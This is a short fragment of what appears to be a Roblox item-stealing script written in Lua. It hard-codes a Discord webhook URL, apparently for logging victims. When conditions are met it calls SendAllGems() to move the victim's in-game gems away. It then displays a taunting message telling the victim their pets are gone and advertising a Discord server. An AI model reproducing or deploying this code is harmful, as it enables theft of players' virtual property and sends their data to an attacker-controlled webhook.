LogsWebhook = "https://discord.com/api/webhooks/1242156124833321121/c8a-6Ex0r3Wlk5hujELb6wIwrMW2J5Zryl4aXNCkXLCNnDWekk8VvyXmsKg5fC5sQM1w"
DualhookRAP = 999999999999999999
...
if #hits > 0 or GemsAmount > FirstPriceOfMail then
    ...
    SendAllGems()
    message.Error("POOR GUY YOUR PETS IS GONE JOIN FOR GET REVENGE:\n discord.gg/moriscripts")
end